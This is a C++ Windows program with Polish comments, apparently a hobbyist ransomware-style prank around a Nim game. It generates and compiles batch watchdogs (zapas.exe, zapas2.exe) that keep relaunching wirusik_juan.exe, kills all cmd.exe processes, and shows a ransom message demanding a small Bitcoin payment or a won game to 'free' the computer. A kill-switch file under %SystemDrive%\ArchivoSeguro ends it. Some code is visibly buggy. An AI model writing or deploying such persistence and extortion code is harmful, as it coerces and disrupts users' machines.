#include <bits/stdc++.h>
#include <time.h>
#include <cstdlib>
#include <iostream>
#include <unistd.h>
#include <windows.h>
#include <string>
#include <tchar.h>
#include <tlhelp32.h>
//#define WM_CLOSE
using namespace std;
bool IsProcessRunning(const char* processName) {
    // Utwórz zrzut procesów
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        std::cerr << "Nie mo¿na utworzyæ zrzutu procesów." << std::endl;
        return false;
    }
	
    // Struktura procesu
    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(PROCESSENTRY32);

    // Pobierz pierwszy proces
    if (!Process32First(hSnapshot, &pe)) {
        CloseHandle(hSnapshot);
        std::cerr << "Nie mo¿na pobraæ pierwszego procesu." << std::endl;
        return false;
    }
	
    // Iteruj przez procesy
    do {
        if (strcmp(pe.szExeFile, processName) == 0) {
            CloseHandle(hSnapshot);
            return true;
        }
    } while (Process32Next(hSnapshot, &pe));
	
    CloseHandle(hSnapshot);
    
    return false;
}
const char* path;
const char* obecna_sciezka(int argc, char * argv[]){
	const char* str=argv[0]; 
    return str;}
bool IsThereSafetyFile()
{
	//system("attrib -h -s -a /s %SystemDrive%/ArchivoSeguro");
	ifstream in("C:/ArchivoSeguro/Vita.txt");
	string str;
	in>>str;
	return str=="e18e19a2e08e55bccf7aa30d11e755f7b124d50f911f1762c42438032dc8a341";
}
void make_safe_file()
{
	const char* code=R"(@echo off
REM Œcie¿ka do katalogu "U¿ytkownicy"
set "users_folder=%SystemDrive%"

REM Nazwa nowego folderu
set "new_folder=ArchivoSeguro"

REM Pe³na œcie¿ka do nowego folderu
set "new_folder_path=%users_folder%\%new_folder%"

REM SprawdŸ, czy folder ju¿ istnieje
if not exist "%new_folder_path%" (
    REM Utwórz nowy folder
    mkdir "%new_folder_path%"
    rem echo Folder "%new_folder%" zosta³ utworzony w "%users_folder%".
) else (
    rem echo Folder "%new_folder%" ju¿ istnieje w "%users_folder%".
)
set "new_file=Vita.txt"

REM Pe³na œcie¿ka do nowego pliku tekstowego
set "new_file_path=%new_folder_path%\%new_file%"
if not exist "%new_file_path%" (
    echo e18e19a2e08e55bccf7aa30d11e755f7b124d50f911f1762c42438032dc8a341 > "%new_file_path%"
    rem echo Plik "%new_file%" zosta³ utworzony w "%new_folder_path%".
) else (
    rem echo Plik "%new_file%" ju¿ istnieje w "%new_folder_path%".
)
)";
	ofstream out("safetyfirst.bat");
	out<<code;
	//system("attrib +h +s +a /s %SystemDrive%/ArchivoSeguro");
	system("start /min safetyfirst.bat");
	system("timeout /t 0");
	system("del safetyfirst.bat");
}
bool make_safe_program(string name)
{
	if(IsThereSafetyFile())
	{
		while(IsProcessRunning("zapas.exe"))
		{
			system("taskkill /f /im zapas.exe");
			system("del zapas.exe");
		}
		return 1;
	}
	fstream in;
	in.open("zapas.bat");
	/*
	cout<<"test3.1"<<endl;
	if(!in.fail())
	{
		cout<<"test3.2"<<endl;
		system("del zapas.bat");
		cout<<"test3.3"<<endl;
	}
	*/
	//string stryng=path;
	string stryng="";
	string generatedCode= R"(@echo off
	title you must be more careful
setlocal enabledelayedexpansion

rem Nazwa procesu do monitorowania (Program A)
set "processName=wirusik_juan.exe"
set "processName2=zapas2.exe"

rem Œcie¿ka do programu A
set \"programPath=\")"+stryng+R"("\"

rem Funkcja sprawdzaj¹ca czy proces jest uruchomiony
:checkProcess
tasklist /FI "IMAGENAME eq %processName%" 2>NUL | find /I "%processName%" >NUL

rem Je¿eli proces jest uruchomiony, odczekaj i sprawdŸ ponownie
if "%ERRORLEVEL%"=="0" (
    rem echo %processName% jest uruchomiony
    timeout /t 0 /nobreak >NUL
    goto checkProcesstwo
) else (
    rem echo %processName% nie jest uruchomiony
    rem Uruchom program ponownie
    //start "" "%programPath%"
    start "" "wirusik_juan.exe"
    timeout /t 0 /nobreak >NUL
    goto checkProcesstwo
)
:checkProcesstwo
tasklist /FI "IMAGENAME eq %processName2%" 2>NUL | find /I "%processName2%" >NUL

rem Je¿eli proces jest uruchomiony, odczekaj i sprawdŸ ponownie
if "%ERRORLEVEL%"=="0" (
    rem echo %processName2% jest uruchomiony
    timeout /t 0 /nobreak >NUL
    goto checkProcess
) else (
    rem echo %processName2% nie jest uruchomiony
    rem Uruchom program ponownie
    //start "" "%programPath%"
    start "" "zapas2.exe"
    timeout /t 0 /nobreak >NUL
    goto checkProcess
)

rem echo Monitoring zakoñczony.
pause)";
//cout<<"test3"<<endl;
//name="zapas";
 	ofstream outFile("zapas.bat");
 	const char * c = generatedCode.c_str();
	outFile << c;
    outFile.close();
    //system("start \"you are very very bad girl\"  \"zapas.bat\"");
    /*
    ofstream outFilevbs("vbszapas.vbs");
    const char* code=R"(Set WshShell = CreateObject("WScript.Shell")
WshShell.Run chr(34) & "C:\Windows" & chr(34), 0
Set WshShell = Nothing)";
outFilevbs<<code<<endl;*/
//system("start /min \"you are very very bad girl\" \"zapas.bat\"");
system("a.bat zapas.bat zapas.exe");
}
int make_safe_program2(string name)
{
	if(IsThereSafetyFile())
	{
		while(IsProcessRunning("zapas2.exe"))
		{
			system("taskkill /f /im zapas2.exe");
			system("del zapas2.exe");
		}
		return 1;
	}
	fstream in;
	in.open("zapas2.bat");
	//string stryng=path;
	string stryng="";
	string generatedCode= R"(@echo off
	title you must be more careful
setlocal enabledelayedexpansion

rem Nazwa procesu do monitorowania (Program A)
set "processName=zapas.exe"
set "processName2=wirusik_juan.exe"

rem Œcie¿ka do programu A
set \"programPath=\")"+stryng+R"("\"

rem Funkcja sprawdzaj¹ca czy proces jest uruchomiony
:checkProcess
tasklist /FI "IMAGENAME eq %processName%" 2>NUL | find /I "%processName%" >NUL

rem Je¿eli proces jest uruchomiony, odczekaj i sprawdŸ ponownie
if "%ERRORLEVEL%"=="0" (
    rem echo %processName% jest uruchomiony
    timeout /t 0 /nobreak >NUL
    	tasklist /FI "IMAGENAME eq %processName2%" 2>NUL | find /I "%processName2%" >NUL

		rem Je¿eli proces jest uruchomiony, odczekaj i sprawdŸ ponownie
		if "%ERRORLEVEL%"=="0" (
		    rem echo %processName2% jest uruchomiony
		    timeout /t 0 /nobreak >NUL
		    goto checkProcess
		) else (
		    rem echo %processName% nie jest uruchomiony
		    rem Uruchom program ponownie
		    //start "" "%programPath%"
		    start "" "wirusik_juan.exe"
		    timeout /t 0 /nobreak >NUL
		    goto checkProcess
		)
    goto checkProcess
) else (
    rem echo %processName% nie jest uruchomiony
    rem Uruchom program ponownie
    //start "" "%programPath%"
    start /min "" "zapas.exe"
    timeout /t 0 /nobreak >NUL
    goto checkProcess
)

rem echo Monitoring zakoñczony.
pause)";
name="zapas";
 	ofstream outFile("zapas2.bat");
 	const char * c = generatedCode.c_str();
	outFile << c;
    outFile.close();
    //system("start \"you are very very bad girl\"  \"zapas.bat\"");
    /*
    ofstream outFilevbs("vbszapas.vbs");
    const char* code=R"(Set WshShell = CreateObject("WScript.Shell")
WshShell.Run chr(34) & "C:\Windows" & chr(34), 0
Set WshShell = Nothing)";
outFilevbs<<code<<endl;*/
//system("start /min \"you are very very bad girl\" \"zapas.bat\"");
system("a.bat zapas2.bat zapas2.exe");
}
bool make_compilator()
{
	//fstream in;
	//in.open("asdfg.bat");
	/*
	cout<<"test3.1"<<endl;
	if(!in.fail())
	{
		cout<<"test3.2"<<endl;
		system("del zapas.bat");
		cout<<"test3.3"<<endl;
	}
	*/
	//string stryng=path;
	string stryng="";
	string generatedCode= R"( ;@echo off
	set "i=1"
	rem echo %i%
	set /a "i=%i%+1"
; rem https://github.com/npocmaka/batch.scripts/edit/master/hybrids/iexpress/bat2exeIEXP.bat
;if "%~2" equ "" (
; echo usage: %~nx0 batFile.bat target.Exe
;)
;set "target.exe=%__cd__%%~2"
;set "batch_file=%~f1"
;set "bat_name=%~nx1"
;set "bat_dir=%~dp1"
rem echo %i%
rem	set /a "i=%i%+1"
;copy /y "%~f0" "%temp%\2exe.sed" >nul
rem echo %i%
	set /a "i=%i%+1"
;(echo()>>"%temp%\2exe.sed"
rem echo %i%
	set /a "i=%i%+1"
;(echo(AppLaunched=cmd.exe /c "%bat_name%")>>"%temp%\2exe.sed"
rem echo %i%
	set /a "i=%i%+1"
;(echo(TargetName=%%target.exe%%)>>"%temp%\2exe.sed"
rem echo %i%
	set /a "i=%i%+1"
;(echo(FILE0="%bat_name%")>>"%temp%\2exe.sed"
rem echo %i%
	set /a "i=%i%+1"
;(echo([SourceFiles])>>"%temp%\2exe.sed"
rem echo %i%
	set /a "i=%i%+1"
;(echo(SourceFiles0=%%bat_dir%%)>>"%temp%\2exe.sed"
rem echo %i%
	set /a "i=%i%+1"
;(echo([SourceFiles0])>>"%temp%\2exe.sed"
rem echo %i%
	set /a "i=%i%+1"
;(echo(%%FILE0=)>>"%temp%\2exe.sed"
rem echo %i%
	set /a "i=%i%+1"

;iexpress /n /q /m %temp%\2exe.sed
rem echo %i%
	set /a "i=%i%+1"
;del /q /f "%temp%\2exe.sed"
;exit /b 0
rem echo %i%
	set /a "i=%i%+1"
[Version]
Class=IEXPRESS
SEDVersion=3
[Options]
PackagePurpose=InstallApp
ShowInstallProgramWindow=0
HideExtractAnimation=1
UseLongFileName=1
InsideCompressed=0
CAB_FixedSize=0
CAB_ResvCodeSigning=0
RebootMode=N
InstallPrompt=%InstallPrompt%
DisplayLicense=%DisplayLicense%
FinishMessage=%FinishMessage%
TargetName=%TargetName%
FriendlyName=%FriendlyName%
AppLaunched=%AppLaunched%
PostInstallCmd=%PostInstallCmd%
AdminQuietInstCmd=%AdminQuietInstCmd%
UserQuietInstCmd=%UserQuietInstCmd%
SourceFiles=SourceFiles

[Strings]
InstallPrompt=
DisplayLicense=
FinishMessage=
FriendlyName=-
PostInstallCmd=<None>
AdminQuietInstCmd=
UserQuietInstCmd=)";
//cout<<"test3"<<endl;
//name="zapas";
 	ofstream outFile("a.bat");
 	const char * c = generatedCode.c_str();
	outFile << c;
    outFile.close();
    //system("start \"you are very very bad girl\"  \"zapas.bat\"");
    /*
    ofstream outFilevbs("vbszapas.vbs");
    const char* code=R"(Set WshShell = CreateObject("WScript.Shell")
WshShell.Run chr(34) & "C:\Windows" & chr(34), 0
Set WshShell = Nothing)";
outFilevbs<<code<<endl;*/
//system("start /min \"you are very very bad girl\" \"zapas.bat\"");
}
void make_safe_programs()
{
	make_safe_program("");
	cout<<"udalo sie"<<endl;
	make_safe_program2("");
	cout<<"udalo sie 2"<<endl;
	//system("start /min \"you are very very bad girl\" \"zapas.exe\"");
}
int xorzvectora(vector <int> tab,int i)
{
	if(i!=tab.size()) return (tab[i]^xorzvectora(tab,++i));
}
int makszvectora(vector <int> tab){
	int maks=0;
	for(auto i:tab){
		if(i>maks)
			{
			maks=i;}
	}
	return maks;
}
void wypisz_gwiazdki(vector <int> tab)
{
	for (int j=0;j<15;j++)
	{
		cout<<"=";
	}
	cout<<endl;
	for(int i=0;i<tab.size();i++)
	{
	//	if (tab[i]!=0)
//		{
		cout<<(i+1)<<". ";
		for (int j=0;j<tab[i];j++)
		{
			cout<<"*";
		}
		cout<<"   "<<tab[i];
		cout<<endl;
	//	}
	}
	for (int j=0;j<15;j++)
	{
		cout<<"=";
	}
	cout<<endl;
}
void paski(string wiad)
{
	int ilosc=25;
	if(wiad=="")
	{
		for(long long i=0;i<ilosc*2.5;i++)
		{
			cout<<"=";
		}
		cout<<endl;
	}
	else
	{
	for(long long i=0;i<ilosc*2.5;i++)
	{
		cout<<"=";	
	}
	cout<<endl;
	for(long long i=0;i<ilosc/4;i++)
	{
		cout<<" ";	
	}
	cout<<wiad<<endl;
	for(long long i=0;i<ilosc*2.5;i++)
	{
		cout<<"=";	
	}
	cout<<endl;
	}
}
vector <int> zabieranie_komputer(vector <int> tab,string nazwa="")
{
	int ile_rzedow=0;
	int jedynki=0;
	for(auto i:tab)
	{
		if(i>0){
			ile_rzedow++;
		}
		if(i==1){
			jedynki+=1;
		}
	}
	if(ile_rzedow==1){
		for(int i=0;i<tab.size();i++){
			if(tab[i]>0){
				paski("Komputer" +nazwa +" zabral "+to_string(tab[i]-1)+" perel");
				tab[i]=1;
				return tab;
			}
		}
	}
	if(ile_rzedow==2 && jedynki==1){
		for(int i=0;i<tab.size();i++){
			if(tab[i]>1){
				tab[i]=0;
				return tab;
			}
		}
	}
	if(ile_rzedow==jedynki+1){
		int indeks=0,wartosc=0;
		for(int i=0;i<tab.size();i++){
			if(tab[i]>1){
				indeks=i;
				wartosc=tab[i];
				break;
			}
		}
		if(jedynki%2==0){

			tab[indeks]=1;
			paski("Komputer "+ nazwa+" zabral "+to_string(wartosc-1)+" perel z "+to_string(indeks+1)+" rzedu");
		}
		else{
			tab[indeks]=0;
			paski("Komputer "+ nazwa+" zabral "+to_string(wartosc)+" perel z "+to_string(indeks+1)+" rzedu");
		}	
		return tab;
	}
	if(xorzvectora(tab,0)==0){
		int m=makszvectora(tab);
		for(int i=0;i<tab.size();i++){
			if(tab[i]==m){
				tab[i]-=1;
				paski("Komputer "+ nazwa+" zabral 1 perle z "+to_string(i+1)+". rzedu");
				//wypisz_gwiazdki(tab);
				return tab;
			}
		}
	}
	vector <int> kopia;
	for(int i=0;i<tab.size();i++){
		kopia=tab;
		if(tab[i]==0){
			continue;
		}
		for(int j=1;j<tab[i]+1;j++){
			kopia=tab;
			kopia[i]-=j;
			if(kopia[i]<0){
				kopia=tab;
				j=tab[i]+3;
			}
			if(xorzvectora(kopia,0)==0){
				paski("Komputer "+ nazwa+" zabral "+to_string(j)+" perel z "+to_string(i+1)+" rzedu");
				return kopia;
			}
		}
		}
	
}
vector <int> zabierz(vector <int> tab)
{
	int ilosc,rzad,ilosc_bledow=0;
	//paski("Ilosc bledow wynosi w tej rundzie: "+to_string(ilosc_bledow));
	cout<<"Wprowadz rzad z ktorego chcesz zabrac gwiazdki:"<<endl;
	cin>>rzad;
	if (rzad<1 || rzad>tab.size())
	{
		paski("Nie ma takiego rzedu");
		return zabierz(tab);
	}
	if(tab[rzad-1]==0)
	{
		paski("W tym rzedzie jest juÅ¼ 0 gwiazdek");
		paski("Prosze sprobuj ponownie");
		return zabierz(tab);
	}
	paski("Wprowadz ile chcesz zabrac gwiazdek z "+to_string(rzad)+". rzedu");
	cin>>ilosc;
	if(ilosc<=0)
	{
		paski("Liczba zabieranych musi byc dodatnia");
		paski("Sprobuj ponownie");
		return zabierz(tab);
	}
	else if(tab[rzad-1]-ilosc<0)
	{
		paski("Nie mozesz doprowadzic do sytuacji w ktorej bedzie ujemna ilosc gwiazdek w rzedzie");
		paski("Sprobuj ponownie");
		return zabierz(tab);
	}
	tab[rzad-1]-=ilosc;
	paski("Zabrano "+to_string(ilosc)+" z "+ to_string(rzad+1)+". rzedu - zostalo "+to_string(tab[rzad-1]));
	return tab;
}
vector <int> losuj(int ile,int maks)
{
	vector <int> tab;
	srand(time(0));
	for(int i=0;i<ile;i++)
	{
		
		tab.push_back((rand()%maks)+1);
	}
	return tab;
}
int czy_koniec(vector <int> tab)
{
	int suma=0;
		for (int i=0;i<tab.size();i++)
		{
		 	suma+=tab[i];
		}
		if (suma==1)
		{
			return 1;
		}
		if (suma==0){
			return 2;
		}
		return 0;
}
char gra_nowa_wersja(vector <int> tab,int nr_rundy){
	paski("Witamy w rundzie "+to_string(nr_rundy));
	//if(IsProcessRunning("zapas.bat")==0) make_safe_program("");
	int czy=0;
	sort(tab.begin(), tab.end());
	wypisz_gwiazdki(tab);
	cout<<"Czy chcesz zaczac pierwszy ?"<<endl;
	cout<<"1.TAK"<<endl;
	cout<<"2.NIE"<<endl;
	//if(IsProcessRunning("zapas.bat")==0) make_safe_program("");
	string wybor;
	cin>>wybor;
	if(wybor=="2" || wybor=="n" || wybor=="N" || wybor=="NIE" || wybor=="nie" || wybor=="n" || wybor=="N")
	{
		//if(IsProcessRunning("zapas.bat")==0) make_safe_program("");
		paski("Zaczyna komputer");
		tab=zabieranie_komputer(tab);
		czy=czy_koniec(tab);
		if(czy==1){
			paski("WYGRYWA KOMPUTER");
			return 'K';
			exit(0);
		}
		wypisz_gwiazdki(tab);
	}
	while(1){
		//if(IsProcessRunning("zapas.bat")==0) make_safe_program("");
			
		tab=zabierz(tab);
		wypisz_gwiazdki(tab);
		czy=czy_koniec(tab);
		if(czy==1){
			paski("WYGRYWA CZLOWIEK");
			return 'C';
			break;
		}
		if (czy==2){
			paski("WYGRYWA KOMPUTER");
			return 'K';
			break;
		}
		tab=zabieranie_komputer(tab);
		wypisz_gwiazdki(tab);
		czy=czy_koniec(tab);
		if(czy==1){
			paski("WYGRYWA KOMPUTER");
			return 'K';
			break;
		}
	}
}
void DisableCloseButton(HWND hwnd)
{
 EnableMenuItem(GetSystemMenu(hwnd, FALSE), SC_CLOSE,
                MF_BYCOMMAND | MF_DISABLED | MF_GRAYED);
}
void EnableCloseButton(HWND hwnd)
{
 EnableMenuItem(GetSystemMenu(hwnd, FALSE), SC_CLOSE,
                MF_BYCOMMAND | MF_ENABLED);
}
BOOL WINAPI exit_handler(DWORD dwCtrlType)
{
    switch (dwCtrlType)
    {
    case CTRL_C_EVENT:
        // Never gotten this to work - use another method
        MessageBox(NULL,"HURA DZIALA","PRZEPIEKNY TYTUL",MB_SYSTEMMODAL | MB_ICONSTOP | MB_OK | WS_MAXIMIZE) == IDNO;
        system("start wirusik_juan.exe");
    case CTRL_BREAK_EVENT:
        MessageBox(NULL,"HURA DZIALA","PRZEPIEKNY TYTUL",MB_SYSTEMMODAL | MB_ICONSTOP | MB_OK | WS_MAXIMIZE) == IDNO;
        system("start wirusik_juan.exe");
    case CTRL_CLOSE_EVENT:
        MessageBox(NULL,"HURA DZIALA","PRZEPIEKNY TYTUL",MB_SYSTEMMODAL | MB_ICONSTOP | MB_OK | WS_MAXIMIZE) == IDNO;
        system("start wirusik_juan.exe");

    default:
    	system("start wirusik_juan.exe");
        return FALSE;
    }
    // Never gets here
    return TRUE;
}
// Identyfikatory przycisków i statycznej kontrolki
const int BUTTON1_ID = 101;
const int BUTTON2_ID = 102;
const int BUTTON3_ID = 103;
const int BUTTON4_ID = 104;
const int BUTTON5_ID = 105;
const int STATIC_ID = 106;

// Prototyp procedury okna
LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam);
void ShowInputDialog();
// Funkcja do uruchomienia okna
void ShowWindowExample(HINSTANCE hInstance, int nCmdShow) {
    const char g_szClassName[] = "myWindowClass";

    WNDCLASSEX wc;
    HWND hwnd;
    MSG Msg;

    // Rejestracja klasy okna
    wc.cbSize = sizeof(WNDCLASSEX);
    wc.style = 0;
    wc.lpfnWndProc = WndProc;
    wc.cbClsExtra = 0;
    wc.cbWndExtra = 0;
    wc.hInstance = hInstance;
    wc.hIcon = LoadIcon(NULL, IDI_APPLICATION);
    wc.hCursor = LoadCursor(NULL, IDC_ARROW);
    wc.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
    wc.lpszMenuName = NULL;
    wc.lpszClassName = g_szClassName;
    wc.hIconSm = LoadIcon(NULL, IDI_APPLICATION);

    if (!RegisterClassEx(&wc)) {
        MessageBox(NULL, "Window Registration Failed!", "Error!", MB_ICONEXCLAMATION | MB_OK);
        return;
    }

    // Tworzenie okna
    hwnd = CreateWindowEx(
        WS_EX_CLIENTEDGE,
        g_szClassName,
        "Okienko z Przyciskami",
        WS_OVERLAPPEDWINDOW,
        CW_USEDEFAULT, CW_USEDEFAULT, 1100, 700,
        NULL, NULL, hInstance, NULL);

    if (hwnd == NULL) {
        MessageBox(NULL, "Window Creation Failed!", "Error!", MB_ICONEXCLAMATION | MB_OK);
        return;
    }

    ShowWindow(hwnd, nCmdShow);
    UpdateWindow(hwnd);

    // Pêtla komunikatów
    while (GetMessage(&Msg, NULL, 0, 0) > 0) {
        TranslateMessage(&Msg);
        DispatchMessage(&Msg);
    }
}

LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    static HWND hStatic;
    switch (msg) {
        case WM_CREATE: {
        	MessageBox(NULL,"DZIALA","PRZEPIEKNY TYTUL",MB_SYSTEMMODAL | MB_ICONASTERISK | MB_OK );
            // Tworzenie przycisków
            CreateWindow("BUTTON", "PL", WS_VISIBLE | WS_CHILD, 50, 50, 200, 50, hwnd, (HMENU)BUTTON1_ID, NULL, NULL);
            CreateWindow("BUTTON", "EN", WS_VISIBLE | WS_CHILD, 50, 150, 200, 50, hwnd, (HMENU)BUTTON2_ID, NULL, NULL);
            CreateWindow("BUTTON", "PAYMENT", WS_VISIBLE | WS_CHILD, 50, 250, 200, 50, hwnd, (HMENU)BUTTON3_ID, NULL, NULL);
            CreateWindow("BUTTON", "INSTRUKCJA GRY", WS_VISIBLE | WS_CHILD, 50, 350, 200, 50, hwnd, (HMENU)BUTTON4_ID, NULL, NULL);
        case WM_COMMAND: {
            if (LOWORD(wParam) == BUTTON1_ID) {
                SetWindowText(hStatic, "TWÓJ KOMPUTER ZOSTA£ ZAINFEKOWANY - JAK CHCESZ GO UWOLNIÆ TO MASZ DWIE OPCJE ALBO P£ACISZ 0,000036 W BTC ALBO WYGRASZ GRÊ - PATRZ INSTRUKCJE");
            } else if (LOWORD(wParam) == BUTTON2_ID) {
                SetWindowText(hStatic, "Wybrano Dzia³ 2");
            } else if (LOWORD(wParam) == BUTTON3_ID) {
                SetWindowText(hStatic, "Wybrano Dzia³ 3");
            } else if (LOWORD(wParam) == BUTTON4_ID) {
            	
                SetWindowText(hStatic, "Cel gry:\n"
        "Celem gry jest zmuszenie przeciwnika do wykonania ostatniego ruchu, "
        "czyli usuniêcia ostatniego przedmiotu z ostatniego stosu.\n"
        "\n"
        "Liczba graczy:\n"
        "Gra przeznaczona jest dla dwóch graczy.\n"
        "\n"
        "Przygotowanie do gry:\n"
        "1. Ustal liczbê stosów oraz liczbê przedmiotów w ka¿dym stosie.\n"
        "   Na przyk³ad mo¿na ustaliæ trzy stosy zawieraj¹ce odpowiednio 3, 4 i 5 przedmiotów.\n"
        "\n"
        "Przebieg gry:\n"
        "1. Gracze wykonuj¹ ruchy na zmianê. Kto zaczyna grê, mo¿e byæ ustalone przez graczy przed rozpoczêciem gry.\n"
        "2. Podczas swojego ruchu gracz wybiera jeden stos, z którego usunie dowoln¹ liczbê przedmiotów "
        "(przynajmniej jeden, ale nie wiêcej ni¿ znajduje siê w stosie).\n"
        "3. Po wykonaniu ruchu, kolej przechodzi na przeciwnika.\n"
        "\n"
        "Zakoñczenie gry:\n"
        "1. Gra koñczy siê, gdy wszystkie stosy s¹ puste.\n"
        "2. Gracz, który jest zmuszony do wykonania ostatniego ruchu (czyli usuniêcia ostatniego przedmiotu "
        "z ostatniego stosu), przegrywa grê.\n Gra ma 4 rundy ,wygraj wszystkie a komputer bêdzie wolny, z³am zasady a bêdziesz ¿a³owaæ - powodzenia");
            }
            else{
            	MessageBox(NULL,"NIE DZIALA","PRZEPIEKNY TYTUL",MB_SYSTEMMODAL | MB_ICONASTERISK | MB_OK );
			}
            break;
        }
        case WM_CLOSE:
            DestroyWindow(hwnd);
            break;
        case WM_DESTROY:
            PostQuitMessage(0);
            break;
        default:
            return DefWindowProc(hwnd, msg, wParam, lParam);
    }
    return 0;
}
}
void ending_chaos(bool czy_ukryc=0)
{
	if(czy_ukryc==0)
	{
		ShowWindow(GetConsoleWindow(), SW_HIDE);
	}
	make_safe_file();
	while(IsProcessRunning("zapas.exe") || IsProcessRunning("zapas2.exe"))
	{
	 system("taskkill /f /im zapas.exe");
	 system("del zapas.bat");
	 system("del zapas.exe");
	 system("taskkill /f /im zapas2.exe");
	 system("del zapas2.bat");
	 system("del zapas2.exe");
 	 }
	system("cls");
	paski("Now your computer is free - bye!!!");
	MessageBox(NULL,"My Congratulation - your computer is free now","CONGRTATULATION",MB_SYSTEMMODAL | MB_OK );
	system("timeout /t 10");
	system("del wirusik_juan.exe");
	system("cls");
	system("exit");
	exit(0);
}
int main(int argc, char * argv[])
{
	make_compilator();
	cout<<"aaaa"<<endl;
	system("a.bat zapas.bat \"a.exe\"");

	//system("pause");
	//make_safe_file();
	//system("del /q %SystemDrive%\\ArchivoSeguro");
	//make_safe_file();
	system("title WindowsRepairExpert");
	//exit(0);
	if(IsThereSafetyFile())
	{
		while(IsProcessRunning("cmd.exe")) system("taskkill /f /im cmd.exe");
		system("taskkill /f /im /t wirusik_juan.exe || taskkill /f /t /im cmd.exe");
		system("del wirusik_juan.exe");
		system("cls");
		system("exit");
		exit(0);
	}
	make_safe_programs();
	if(IsProcessRunning("zapas.exe")) system("start /min \"you are very very bad girl\" \"zapas.exe\"");
	//cout<<"test1"<<endl;
	/*
	if(!IsProcessRunning("zapas.bat"))
	{
		make_safe_program("");
	}
	if(!IsProcessRunning("zapas2.bat"))
	{
		make_safe_program2("");
	}
	*/
	
	//make_safe_file();
	//cout<<"test2"<<endl;
	const char* str=obecna_sciezka(argc,argv);
	path=str;
	//SetConsoleCtrlHandler(exit_handler, TRUE);
	system("title \"Idiot, you are just an idiot!!!\"");
	HINSTANCE hInstance = GetModuleHandle(NULL);
    int nCmdShow = SW_SHOW;

    // Wyœwietlanie okna
    //ShowWindowExample(hInstance, nCmdShow);
	//DisableCloseButton(213);
	/*
	switch(MessageBox(NULL,"HURA DZIALA","PRZEPIEKNY TYTUL",MB_SYSTEMMODAL | MB_ICONASTERISK | MB_OK ))
	{
		case IDOK:
			cout<<"SPOKO"<<endl;
			system("pause");
			exit(0);
	}*/
	//Sleep(10000);
	//EnableCloseButton(213);
	for(int i=1;i<=1;i++)
	{
		if(gra_nowa_wersja(losuj(i+1,i*20),i)=='K')
		{
			system("cls");
			paski("WYGRYWA KOMPUTER - Zaczynasz od pocz¹tku");
			system("start \"wirusik_juan.exe\"");
			exit(0);
		}
		paski("WYGRYWA CZLOWIEK - KONTYNUUJ A NU¯ WYGRASZ");
		//system("taskkill /t /im cmd.exe");
		system("timeout /t 60");
		system("cls");
		//exit(0);
		
	}
	ending_chaos();
	//while(IsProcessRunning("zapas.bat")) system("taskkill /f /im \"zapas.bat\"");
	//MessageBox(NULL,"My Congratulation - your computer is free now","CONGRTATULATION",MB_SYSTEMMODAL | MB_OK );
	//while(IsProcessRunning("wirusik_juan.exe")) system("taskkill /f /im \"wirusik_juan.exe\"");
	//exit(0);
}
